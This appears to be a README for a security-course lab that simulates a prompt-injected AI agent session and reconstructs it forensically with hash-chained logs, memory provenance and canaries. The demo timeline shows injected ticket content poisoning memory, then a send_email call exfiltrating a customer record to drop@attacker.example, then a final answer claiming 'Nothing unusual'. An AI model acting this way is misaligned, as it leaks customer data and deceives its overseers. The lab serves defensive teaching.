# Lab 07: Reconstructing a Compromised Agent Session from Memory Artifacts

> **Chapter 3 exercise:** Reconstructing a Compromised Agent Session from Memory Artifacts
> **Study first:** [Lesson 04, section 2.4](../../04-defending-memory-context-and-tool-use.md#24-detecting-a-compromised-agent-after-the-fact)
> **Generic material in this repo:** [05-agent-security/monitoring-and-response (kill switch, IR runbook)](../../../../05-agent-security/monitoring-and-response/README.md) · [CMCPSE tool-invocation-logging](../../../../cmcpse-course/ch4-defending-and-hardening-mcp-servers/labs/tool-invocation-logging/README.md) · [10-capstone lesson 05 AI SOC triage](../../../../10-capstone-project/README.md)

Offline, harmless and tested. No network, no API key, no GPU, no Docker needed by the tests. Secrets are canaries or clearly fake values; domains end in `.example`. The model is a `MockLLM` subclass: deterministic and deliberately gullible. The lab is **self-contained** (it does not import code from another lab).

## What it simulates

A simulator writes a transcript, a hash-chained tool log and a memory file for a compromised session (a ticket with an injection, a memory write with untrusted provenance, a customer read, an e-mail to an outside address, and a final answer that says "Nothing unusual"). The analyzer rebuilds the **timeline**, checks log integrity, finds the **injection point**, finds the first anomaly after it, and **scores the blast radius**.

## Files

`forensics.py` (`simulate_session`, `reconstruct`, `verify_log`) · `demo.py` · `test_caase_ch3_forensics.py`

## Vulnerable vs defended

| | |
|---|---|
| **Vulnerable** | Only the final transcript is kept: it looks fine. A log with no chain can be edited without a trace. |
| **Defended** | Tool log with a hash chain (edits and deletions are located), memory with provenance, a canary registry to prove exposure, off-policy detection, a score and recommended containment actions. |

## Run it

```powershell
.venv/Scripts/python caase-course/ch3-agent-memory-context-and-tool-use/labs/07-session-reconstruction/demo.py
.venv/Scripts/python -m pytest caase-course/ch3-agent-memory-context-and-tool-use/labs/07-session-reconstruction -v
```

## Real demo output

(Canary suffixes are random on every run.)

```text
== timeline
  t=1   memory     write city=Berlin source=user
  t=9   transcript user: Please triage ticket 7
  t=10  tool       #0 get_ticket({"id": "7"}) trust=untrusted
  t=11  memory     write reply_to=drop@attacker.example source=tool:get_ticket [UNTRUSTED PROVENANCE]
  t=12  tool       #1 read_customer({"id": "7"}) trust=trusted
  t=13  tool       #2 send_email({"to": "drop@attacker.example", "body": "record: C) trust=trusted
  t=14  transcript assistant: Ticket triaged. Nothing unusual.

log integrity ok: True
injection point : tool-log entry # 0
first anomaly   : tool-log entry # 2
exposed secrets : ['customer-7-record']
exfiltrated     : ['customer-7-record']
tainted memory  : ['reply_to (from tool:get_ticket)']
score / severity: 85 critical
actions:
  - rotate/invalidate exposed secrets and notify the data owner
  - purge memory entries from untrusted sources before the next session
  - block the content source behind tool-log entry #0
```

9 tests pass.

## Try it yourself

Add a second compromised session that shares the poisoned memory entry and show the analyzer links them. Add a rule for a canary seen in a result that was never requested by the user turn.

## Limits

Real forensics needs complete, tamper-evident logs from the start; you cannot reconstruct what you did not record. Timestamps here are fixed integers; real ones need clock discipline.
